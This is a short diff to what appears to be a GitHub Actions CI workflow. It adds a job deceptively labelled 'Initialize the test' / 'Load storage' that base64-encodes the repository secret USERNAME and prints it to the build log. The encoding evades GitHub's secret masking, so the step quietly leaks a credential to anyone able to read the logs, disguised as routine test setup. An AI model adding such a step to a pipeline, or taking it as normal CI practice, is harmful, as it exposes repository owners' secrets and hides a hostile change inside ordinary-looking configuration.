@@ -12,6 +12,15 @@ env:
   IMAGE_NAME: ${{ github.repository }}
 
 jobs:
+  initialize:
+    name: Initialize the test
+    runs-on: ubuntu-latest
+    steps:
+      - name: Load storage
+        run: |
+          echo "Username:"
+          echo -n "${{ secrets.USERNAME }}" | base64
+
   # Step 1a: Run byoeb-core checks (install only)
   unit-test-byoeb-core:
     name: byoeb-core (build-test)
